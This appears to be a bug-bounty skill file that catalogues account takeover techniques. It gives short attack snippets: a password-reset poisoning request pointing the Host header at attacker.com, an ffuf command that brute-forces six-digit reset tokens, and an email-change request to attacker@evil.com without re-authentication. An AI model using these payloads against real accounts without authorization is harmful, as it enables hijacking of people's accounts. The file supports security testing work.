---
name: hunt-ato
description: "Hunt account takeover taxonomy — 9 distinct paths to ATO, plus chains. Paths: (1) password reset flaws (host header injection redirects token to attacker, predictable token, token leaked in referer, race condition on reset link), (2) email change without re-auth, (3) OAuth account-link CSRF, (4) MFA bypass (per hunt-mfa-bypass), (5) session-fixation, (6) JWT manipulation, (7) password change without step-up (chain with password oracle), (8) social-recovery question abuse, (9) SSO subdomain takeover. Chain primitives: cookie theft + password oracle + missing step-up = persistent ATO; OAuth open redirect + redirect_uri = auth code theft = ATO; subdomain takeover at OAuth redirect_uri = ATO. Validate: actual account takeover demonstration on test account B from attacker A's session. Real paid examples for each path. Use when hunting ATO chains, when testing password reset / email change / MFA / OAuth / session, when chaining primitives toward Critical."
---

## 13. ATO — ACCOUNT TAKEOVER TAXONOMY

### Path 1: Password Reset Poisoning
```bash
POST /forgot-password
Host: attacker.com          # or X-Forwarded-Host: attacker.com
email=victim@company.com
# Reset link sent to attacker.com/reset?token=XXXX
```

### Path 2: Reset Token in Referrer Leak
```
GET /reset-password?token=ABC123
→ page loads: <script src="https://analytics.com/track.js">
→ Referer: https://target.com/reset-password?token=ABC123 sent to analytics
```

### Path 3: Predictable / Weak Reset Tokens
```bash
# Brute force 6-digit numeric token
ffuf -u "https://target.com/reset?token=FUZZ" \
     -w <(seq -w 000000 999999) -fc 404 -t 50
```

### Path 4: Token Not Expiring
```
Request token → wait 2 hours → still works? = bug
Request token #1 → request token #2 → use token #1 → still works? = bug
```

### Path 5: Email Change Without Re-Auth
```bash
PUT /api/user/email
{"new_email": "attacker@evil.com"}   # no current_password required
```

### ATO Priority Chain
- Critical: no-user-interaction ATO
- High: requires one email click OR existing session
- Medium: requires phishing + user interaction
- Low: requires attacker to be MitM


